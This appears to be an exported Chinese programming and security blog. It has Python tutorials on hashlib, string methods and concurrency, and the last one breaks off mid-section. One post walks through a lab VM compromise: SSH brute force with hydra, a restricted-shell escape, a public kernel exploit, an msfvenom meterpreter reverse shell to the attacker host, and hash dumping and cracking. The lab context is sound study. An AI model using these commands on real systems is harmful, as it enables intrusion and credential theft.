<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span>  hashlib</span><br><span class="line"></span><br><span class="line">a = string.digits + string.lowercase + string.uppercase</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> a:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> a:</span><br><span class="line">                s = hashlib.md5(i+j+k+m).hexdigest()[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">                <span class="keyword">if</span> s == <span class="string">'9bf514'</span>:</span><br><span class="line">                    <span class="keyword">print</span> i+j+k+m</span><br></pre></td></tr></table></figure>
<p>2.用hashlib模拟用户登录，以及password值加盐存储：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, hashlib</span><br><span class="line">dic = &#123; <span class="string">'syq123'</span>: <span class="string">'506420d6fc050439850f1cb80eb70b9c'</span>,</span><br><span class="line">        <span class="string">'feifei'</span>: <span class="string">'f95f65d787a87a5e3d32c61b3f7e9bec'</span>,</span><br><span class="line">        <span class="string">'zsg123'</span>: <span class="string">'87c34b8d2950946df7a987a990cad99f'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_md5</span><span class="params">(password)</span>:</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(password)</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Salt_get_md5</span><span class="params">(password,name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> get_md5(password + name + <span class="string">'salt'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">username</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#创建用户</span></span><br><span class="line">    name = raw_input(<span class="string">'please input your username!!'</span>)</span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">r'^[a-zA-Z].&#123;2,9&#125;'</span>,name):</span><br><span class="line">        userpassword(name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'input error!'</span></span><br><span class="line">        username()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">userpassword</span><span class="params">(name)</span>:</span></span><br><span class="line">    password = raw_input(<span class="string">'please input your password:'</span>)</span><br><span class="line">    password = Salt_get_md5(password,name)</span><br><span class="line">    <span class="keyword">print</span> password</span><br><span class="line">    dic[name] = password    <span class="comment">#这里如果用update方法时会出现一个问题，添加进字典的不是变量对应的值，而是输入的变量名称</span></span><br><span class="line">    <span class="keyword">print</span> dic</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    str = <span class="string">'Please Login'</span></span><br><span class="line">    <span class="keyword">print</span> str.center(<span class="number">25</span>)</span><br><span class="line">    name = raw_input(<span class="string">'please input your username:'</span>)</span><br><span class="line">    password = raw_input(<span class="string">'please input your password:'</span>)</span><br><span class="line">    password = Salt_get_md5(password,name)</span><br><span class="line">    <span class="keyword">if</span> dic[name] == password:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Login Success!'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Login faild! username or password error!'</span></span><br><span class="line">        login()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    ch = raw_input(<span class="string">'请选择1或2:1-&gt;登录，2-&gt;注册'</span>)</span><br><span class="line">    <span class="comment"># print type(ch)</span></span><br><span class="line">    <span class="keyword">if</span> ch == <span class="string">'1'</span>:</span><br><span class="line">        login()</span><br><span class="line">    <span class="keyword">elif</span> ch == <span class="string">'2'</span>:</span><br><span class="line">        username()</span><br><span class="line">        ch = raw_input(<span class="string">'请选择1或2:1-&gt;登录，2-&gt;退出'</span>)</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="string">'1'</span>:</span><br><span class="line">            login()</span><br><span class="line">        <span class="keyword">elif</span> ch ==<span class="string">'2'</span>:</span><br><span class="line">            exit(<span class="string">'bye!!!'</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>hashlib</tag>
      </tags>
  </entry>
  <entry>
    <title>python字符操作</title>
    <url>/2018/08/29/python%E5%AD%97%E7%AC%A6%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h3 id="字符串操作需求"><a href="#字符串操作需求" class="headerlink" title="字符串操作需求"></a>字符串操作需求</h3><blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; string模块定义了一些常用的属性（包含所有的数字，字母，可打印的所有ascii码等）</span><br><span class="line">&gt; python的字符串操作可以通过两部分的方法函数基本上就可以解决所有的字符串操作需求：</span><br><span class="line">&gt; 1.python的字符串属性函数</span><br><span class="line">&gt; 2.python的string模块</span><br><span class="line">&gt; 一次python对字符的操作，人生苦短!</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="文档练习实例如下："><a href="#文档练习实例如下：" class="headerlink" title="文档练习实例如下："></a>文档练习实例如下：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">string模块定义了一些常用的属性（包含所有的数字，字母，可打印的所有ascii码等）</span></span><br><span class="line"><span class="string">python的字符串操作可以通过两部分的方法函数基本上就可以解决所有的字符串操作需求：</span></span><br><span class="line"><span class="string">1.python的字符串属性函数</span></span><br><span class="line"><span class="string">2.python的string模块</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#1.字符串输出格式对齐</span></span><br><span class="line"> </span><br><span class="line">str = <span class="string">'PyTHON heLLo'</span></span><br><span class="line"><span class="keyword">print</span> str.center(<span class="number">20</span>)  <span class="comment">#生成20个字符长度，str处于中间位置</span></span><br><span class="line"><span class="keyword">print</span> str.ljust(<span class="number">20</span>)   <span class="comment">#生成20个字符，str左对齐</span></span><br><span class="line"><span class="keyword">print</span> str.rjust(<span class="number">20</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#2.大小写转换</span></span><br><span class="line"><span class="keyword">print</span> str.upper()   <span class="comment">#转大写</span></span><br><span class="line"><span class="keyword">print</span> str.lower()   <span class="comment">#转小写</span></span><br><span class="line"><span class="keyword">print</span> str.capitalize()  <span class="comment">#字符串首字母大写，其余小写</span></span><br><span class="line"><span class="keyword">print</span> str.swapcase()    <span class="comment">#大小写对换</span></span><br><span class="line"><span class="keyword">print</span> str.title()       <span class="comment">#以分隔符为标记，首字符为大写，其余为小写</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#3.字符串判断条件</span></span><br><span class="line">str1 = <span class="string">'01234'</span></span><br><span class="line"><span class="keyword">print</span> str1.isalnum()   <span class="comment">#判断是否全是数字和字母，并至少有一个字符</span></span><br><span class="line"><span class="keyword">print</span> str1.isdigit()   <span class="comment">#判断是否全是数字，并至少有一个字符</span></span><br><span class="line"> </span><br><span class="line">str2 = <span class="string">'string'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> str2.isalnum()   <span class="comment">#判断是否全是数字或字母，并至少有一个字符</span></span><br><span class="line"><span class="keyword">print</span> str2.isalpha()   <span class="comment">#判断是否全是字母，并至少有一个字符</span></span><br><span class="line"><span class="keyword">print</span> str2.islower()   <span class="comment">#判断是否全是小写字母，当全是小写和数字的组合时也会返回True</span></span><br><span class="line"><span class="keyword">print</span> str2.isspace()   <span class="comment">#判断是否全是空白字符，并至少有一个字符</span></span><br><span class="line"><span class="keyword">print</span> str2.isspace()   <span class="comment">#判断是否全是大写，如果全是大写和数字也会返回True</span></span><br><span class="line"><span class="keyword">print</span> str2.istitle()   <span class="comment">#判断是否每个单词的首字母为大写</span></span><br><span class="line"><span class="keyword">print</span> str2.startswith(<span class="string">'str'</span>)  <span class="comment">#判断字符是否以str开头</span></span><br><span class="line"><span class="keyword">print</span> str2.endswith(<span class="string">'ing'</span>)    <span class="comment">#判断字符是否以ing结尾</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#4.字符串搜索定位与替换</span></span><br><span class="line">str3 = <span class="string">'string IEarn'</span></span><br><span class="line"><span class="keyword">print</span> str3.find(<span class="string">'z'</span>) <span class="comment">#查找字符串，没有则返回-1，有则返回查找到的第一个索引</span></span><br><span class="line"><span class="keyword">print</span> str3.rfind(<span class="string">'n'</span>) <span class="comment">#返回索引的最后一次匹配</span></span><br><span class="line"><span class="keyword">print</span> str3.index(<span class="string">'s'</span>) <span class="comment">#没有匹配则报错，如果匹配到则和find类似，返回第一次索引</span></span><br><span class="line"><span class="keyword">print</span> str3.count(<span class="string">'a'</span>) <span class="comment">#返回字符串中匹配的次数</span></span><br><span class="line"><span class="keyword">print</span> str3.replace(<span class="string">'n'</span>,<span class="string">'N'</span>)  <span class="comment">#搜索替换</span></span><br><span class="line"><span class="keyword">print</span> str3.strip(<span class="string">'n'</span>)  <span class="comment">#删除字符串首尾匹配的字符，通常用于默认删除回车符</span></span><br><span class="line"><span class="keyword">print</span> str3.lstrip(<span class="string">'n'</span>) <span class="comment">#左配符</span></span><br><span class="line"><span class="keyword">print</span> str3.rstrip(<span class="string">'n'</span>) <span class="comment">#右配符</span></span><br><span class="line"> </span><br><span class="line">str4 = <span class="string">'tab'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> str4.expandtabs() <span class="comment">#把制表符转换为空格</span></span><br><span class="line"><span class="keyword">print</span> str4.expandtabs(<span class="number">5</span>)<span class="comment">#指定空格数</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#5.字符串编码与解码</span></span><br><span class="line"> </span><br><span class="line">str5 = <span class="string">"字符串学习"</span></span><br><span class="line"><span class="keyword">print</span> str5</span><br><span class="line"><span class="keyword">print</span> str5.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#6.字符串分割变换</span></span><br><span class="line"> </span><br><span class="line">str6 = <span class="string">'Learn string'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'-'</span>.join(str6)</span><br><span class="line"> </span><br><span class="line">str7 = [<span class="string">'Learn'</span>,<span class="string">'string'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'-'</span>.join(str7)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> str6.split(<span class="string">'n'</span>)</span><br><span class="line"><span class="keyword">print</span> str6.split(<span class="string">'n'</span>,<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> str6.rstrip(<span class="string">'n'</span>)</span><br><span class="line"><span class="keyword">print</span> str6.rsplit(<span class="string">'n'</span>,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> str6.splitlines()</span><br><span class="line"><span class="keyword">print</span> str6.partition(<span class="string">'n'</span>)</span><br><span class="line"><span class="keyword">print</span> str6.rpartition(<span class="string">'n'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#7.打印出一些常用的字符</span></span><br><span class="line"><span class="keyword">print</span> string.letters</span><br><span class="line"><span class="keyword">print</span> string.ascii_letters  <span class="comment">#两个都是打印出大小写字母</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> string.lowercase</span><br><span class="line"><span class="keyword">print</span> string.ascii_lowercase <span class="comment">#打印小写字母</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> string.uppercase</span><br><span class="line"><span class="keyword">print</span> string.ascii_uppercase <span class="comment">#打印大写字母</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> string.digits      <span class="comment">#打印十进制数字</span></span><br><span class="line"><span class="keyword">print</span> string.octdigits   <span class="comment">#打印八进制数字</span></span><br><span class="line"><span class="keyword">print</span> string.hexdigits   <span class="comment">#打印十六进制数字</span></span><br><span class="line"><span class="keyword">print</span> string.printable   <span class="comment">#打印数字，大小写字母和特殊字符</span></span><br><span class="line"><span class="keyword">print</span> string.punctuation <span class="comment">#打印特殊字符</span></span><br><span class="line"><span class="keyword">print</span> string.whitespace  <span class="comment">#打印一些如制表符一样的符号</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#8.string中定义的方法</span></span><br><span class="line"><span class="string">"string.capwords(s, sep=None)是多个字符串方法的组合split(),capitalize(),join()"</span></span><br><span class="line">s = <span class="string">'ahelloaworld'</span></span><br><span class="line"><span class="keyword">print</span> string.capwords(s, <span class="string">'a'</span>)</span><br><span class="line"><span class="comment">#等价于：</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'a'</span>.join([i.capitalize() <span class="keyword">for</span> i <span class="keyword">in</span> s.split(<span class="string">'a'</span>)])</span><br><span class="line"> </span><br><span class="line"><span class="comment">#实例：生成200的随机优惠券（长度是20位的）</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">key = string.letters + string.digits</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">    k = [random.choice(key) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>)]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">''</span>.join(k)</span><br></pre></td></tr></table></figure>
<h3 id="练习图示："><a href="#练习图示：" class="headerlink" title="练习图示："></a>练习图示：</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535555956.23.png" alt></p>
]]></content>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>超级玛丽靶机渗透</title>
    <url>/2018/08/19/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h3 id="靶机渗透"><a href="#靶机渗透" class="headerlink" title="靶机渗透"></a>靶机渗透</h3><blockquote>
<p>以前看到一篇关于靶机渗透的文章，看了一下觉得比较有意思，所以下载下来玩了一下。<a href="https://www.anquanke.com/post/id/146527" target="_blank" rel="noopener">原文链接</a></p>
</blockquote>
<h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>靶机IP：192.168.0.105</p>
<p>攻击主机IP：192.168.0.106</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675443.65.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675463.94.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675493.83.png" alt></p>
<h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><ul>
<li><p>靶机只有一个登陆界面，所以端口扫描来一波</p>
<p><code>nmap.exe -sV -p- -T5 192.168.0.105</code></p>
</li>
<li><p>发现开了22和8180端口，访问一下8180端口，可以访问，就从8180端口入手，发现啥都没有，目录扫描走一波 <code>sudo dirb http://192.168.0.105:8180 /usr/share/dirb/wordlists/big.txt</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675825.29.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676045.55.png" alt></p>
</li>
<li><p>发现一个vhosts目录，访问以后得到如下信息：发现有服务名，修改本地hosts文件访问一下<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676106.23.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676228.18.png" alt></p>
</li>
<li><p>然后访问[<a href="http://mario.supermariohost.local:8180/" target="_blank" rel="noopener">http://mario.supermariohost.local:8180/</a> 得到如下界面，并没有发现什么有用的信息，再来一次目录扫描（这里说明一下，本来是没有扫到东西的，所以看了一下原文，发现是扫出来的，也许是字典进行了改进，在后文评论中看到马里奥的弟弟是luigi ，emmm。。果然是）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676343.44.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676499.19.png" alt></p>
</li>
<li><p>访问一下地址：发现一串英文，利用cewl对连接进行爬取然后生成一个自定义的字典 ，这里是对一些单词的提取，针对可能有用的进行提取<code>cewl &lt;http://mario.supermariohost.local:8180/&gt; -d -w /root/Desktop/666.txt</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676681.24.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676860.62.png" alt></p>
</li>
<li><p>利用生成的自定义字典使用john生成一个自定义的密码字典 <code>john --wordlist=/home/dest/666.txt --stdout --rules &gt; 777.txt</code> 这里联想到前面的那个目录luigi和生成的密码，然后对22端口进行爆破</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677018.46.png" alt></p>
<p><code>hydra -l luigi -P /home/toml/777.txt 192.168.0.105 ssh -t 20</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677247.99.png" alt></p>
</li>
<li><p>得到ssh的账号密码，进行登录，登录成功以后发现shell权限被限制了，和python进行沙盒逃逸挺像的<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677310.05.png" alt></p>
</li>
<li><p>在原文中有一篇关于内网渗透中绕过shell限制的文章：<a href="http://www.4hou.com/penetration/11674.html" target="_blank" rel="noopener">www.4hou.com/penetration/11674.html</a> ，通过awk ‘BEGIN{system(“/bin/bash”)}’ 绕过限制,由于测试过进行总结，所以靶机再没重启<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677502.15.png" alt></p>
</li>
<li><p>然后进行提权：通过查看内核发现是3.13.0的内核版本，通过公开的提权程序进行提权：<a href="https://www.exploit-db.com/raw/37292/，下载以后是html,修改后缀名进行编译执行" target="_blank" rel="noopener">https://www.exploit-db.com/raw/37292/，下载以后是html,修改后缀名进行编译执行</a> <code>gcc 77.c -o test</code> 拿到root权限</p>
</li>
<li><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677631.83.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677718.08.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677870.96.png" alt></p>
</li>
<li><p>提权成功后在root目录下发现了flag.zip,解压发现需要密码：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678061.53.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678103.78.png" alt></p>
</li>
<li><p>将靶机上的flag压缩包下载到本地，利用msf生成后门程序，在靶机上下载执行：</p>
<p><code>sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=7777 -f elf &gt; /var/www/html/5.elf</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678360.95.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678383.77.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678435.94.png" alt></p>
</li>
<li><p>利用fcrackzip爆破压缩包的密码 <code>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt flag.zip</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678550.51.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678577.38.png" alt></p>
</li>
<li><p>查看flag发现要拿到所有的账户密码，这个时候已经在msf上反弹shell了，所以先把所有的hash抓下来</p>
<p><code>run post/linux/gather/hashdump</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678687.04.png" alt></p>
</li>
<li><p>然后利用刚才破解的压缩包密码生成字典，将密码保存到一个新的文件夹中，然后生成</p>
<p><code>john --wordlist=/home/toml/newpass.txt --stdout --rules &gt; newpasse.txt</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678803.4.png" alt></p>
</li>
<li><p>加载字典，然后本地破解hash，得到所有的账户密码：</p>
<p><code>john --wordlist=/home/toml/newpasse.txt /home/toml/.msf4/loot/20180819175754_default_192.168.0.105_linux.hashes_331263.txt</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678908.77.png" alt></p>
</li>
<li><p>利用得到的账户密码均登陆成功：渗透完成<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534679220.15.png" alt></p>
</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
<p>本次靶机的渗透测试，看了表哥的文章，思路清晰，收获很多，是一次学习的过程。</p>
</blockquote>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>python进程池和线程池</title>
    <url>/2018/06/28/python%E8%BF%9B%E7%A8%8B%E6%B1%A0%E5%92%8C%E7%BA%BF%E7%A8%8B%E6%B1%A0/</url>
    <content><![CDATA[<h2 id="python进程池和线程池学习"><a href="#python进程池和线程池学习" class="headerlink" title="python进程池和线程池学习"></a>python进程池和线程池学习</h2><blockquote>
<p>前几天学习了python的多进程通信，是python标准库中支持的多进程并发模块multiprocessing ，主要学习了它常用的两个类和几种进程间通信的方法，本文基于这一点继续拓展python的并发中的线程池和进程池。</p>
</blockquote>
<h3 id="多进程和多线程"><a href="#多进程和多线程" class="headerlink" title="多进程和多线程"></a>多进程和多线程</h3><blockquote>
<p>按照书上的话来说“进程是资源分配的最小单位，线程是CPU调度的最小单位 ”但在实际中要分清楚它们的区别与联系才可以运用好多线程和多进程。多进程与多线程的区别 进程是程序在计算机上的一次执行活动。当你运行一个程序，你就启动了一个进程。显然，程序是死的(静态的)，进程是活的(动态的)。进程可以分为系统进程和用户进程。凡是用于完成操作系统的各种功能的进程就是系统进程，它们就是处于运行状态下的操作系统本身；所有由你启动的进程都是用户进程。进程是操作系统进行资源分配的单位。在Windows下，进程又被细化为线程，也就是一个进程下有多个能独立运行的更小的单位。 在同一个时间里，同一个计算机系统中如果允许两个或两个以上的进程处于运行状态，这便是多任务。 </p>
</blockquote>
<ul>
<li>先贴一张图来看多线程和多进程再不同维度的对比：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530154912.57.png" alt></li>
<li>基于上图总结：<ul>
<li>需要频繁创建销毁的优先使用多线程，常见的是web服务器，来一个请求，建立一次连接、通信结束以后销毁连接，所以要使用多线程，如果使用多进程，创建和销毁的代价非常大。</li>
<li>需要进行大量计算的优先使用多线程，由于大量计算需要消耗大量的CPU资源、切换频繁，如图像处理、算法处理，使用多线程切换简单，CPU的利用率高。</li>
<li>处理关系相关性强的优先用多进程、相关性弱的优先用多线程。比如：服务器进行消息的收发和消息的处理，相关性不是很强，使用多进程可以提高并发速度；针对消息的处理有消息解码、业务处理等多种方式，这个时候需要数据间的共享，使用多线程会提高并发速度。</li>
<li>基于分布式的多核多机的优先使用多进程。</li>
<li>满足不同的需求，结合它们的特性选用合理的方式。</li>
</ul>
</li>
</ul>
<h3 id="通过队列实现多线程和多进程的并发"><a href="#通过队列实现多线程和多进程的并发" class="headerlink" title="通过队列实现多线程和多进程的并发"></a>通过队列实现多线程和多进程的并发</h3><ol>
<li><p>使用multiprocessing.JoinableQueue实现多进程并发</p>
<blockquote>
<p>JoinableQueue是multiprocessing的一种数据结构，它本质上是一个FIFO队列，它与一般队列的不同在于它的多进程是安全的，会自动解决互斥和死锁的问题。JoinableQueue主要可以用来存放执行的任务和收集任务的执行结果。 </p>
</blockquote>
<ul>
<li><p>通过多进程并发打印26个字母</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> JoinableQueue</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> random, time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(q)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#这里是多进程并发的要点，q是一个JoinableQueue对象，支持get方法读取第一个元素，如果q中没有元素，进程就会阻塞，直至q中被存入新元素</span></span><br><span class="line">            value = q.get()</span><br><span class="line">            print(<span class="string">'GET &#123;&#125; from queue.'</span>.format(value))</span><br><span class="line">            time.sleep(random.random())</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            q.task_done()</span><br><span class="line"><span class="comment">#通过多进程将26个字母打印出来</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#定义一个存放任务的JoinableQueue对象</span></span><br><span class="line">    q = multiprocessing.JoinableQueue()</span><br><span class="line">    <span class="comment">#实例化两个Process对象（每个对象对应一个子进程）target是实现每个任务工作中的具体函数，args是target函数的参数</span></span><br><span class="line">    pw1 = multiprocessing.Process(target=read, args=(q,))</span><br><span class="line">    pw2 = multiprocessing.Process(target=read, args=(q,))</span><br><span class="line">    <span class="comment">#将子进程设为守护进程———在主进程结束后随之结束</span></span><br><span class="line">    pw1.daemon = <span class="keyword">True</span></span><br><span class="line">    pw2.daemon = <span class="keyword">True</span></span><br><span class="line">    <span class="comment">#子进程就开始独立于父进程运行了，它会在单独的进程里调用target引用的函数——在这里即read函数，它是一个死循环，将参数q中的数一一读取并打印出来</span></span><br><span class="line">    pw1.start()</span><br><span class="line">    pw2.start()</span><br><span class="line">    <span class="comment">#实际上start执行以后进程就阻塞了，由于JoinableQueue对象没有传入元素，等待传入元素才开始执行</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> [chr(ord(<span class="string">'A'</span>)+i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>)]:</span><br><span class="line">        q.put(x)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#这里是查询q中的数据是否已经读完，如果没有读完阻塞程序，等待q中的数据读完才开始继续执行</span></span><br><span class="line">        q.join()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">'stopped by hand'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530162034.1.png" alt></p>
</li>
<li><p>通过这个实例可以看出python通过JoinableQueue实现多进程并发的优雅</p>
</li>
</ul>
</li>
<li><p>通过队列实现多线程的并发</p>
<blockquote>
<p>程序的实现与多进程差别不大，只是这里不用multiProcessing.JoinableQueue进行队列的操作，一般的队列就可以满足要求</p>
</blockquote>
<ul>
<li><p>通过队列实现多线程并发实例：打印26个字母（代码和多进程的差别并不大）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time, random</span><br><span class="line"><span class="keyword">import</span> threading, queue</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(q)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            value = q.get()</span><br><span class="line">            print(<span class="string">'GET &#123;&#125; from queue.'</span>.format(value))</span><br><span class="line">            time.sleep(random.random())</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            q.task_done()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    q = queue.Queue()</span><br><span class="line">    pw1 = threading.Thread(target=read, args=(q,))</span><br><span class="line">    pw2 = threading.Thread(target=read, args=(q,))</span><br><span class="line">    pw1.daemon = <span class="keyword">True</span></span><br><span class="line">    pw2.daemon = <span class="keyword">True</span></span><br><span class="line">    pw1.start()</span><br><span class="line">    pw2.start()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> [chr(ord(<span class="string">'A'</span>)+i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>)]:</span><br><span class="line">        q.put(x)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        q.join()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">'stopped by hand'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530162960.12.png" alt></p>
</li>
</ul>
</li>
</ol>
<h3 id="多线程补充"><a href="#多线程补充" class="headerlink" title="多线程补充"></a>多线程补充</h3><blockquote>
<p>既然说到了用队列实现多线程并发，再补充通过threading初始化，不调用队列实现多线程并发，这里要多出一个线程不安全的问题，用线程锁来解决</p>
</blockquote>
<ol>
<li><p>不设计线程锁实例：(以前测试的时候出现线程不安全的问题，现在运行以后没有了，应该是python版本的修复)</p>
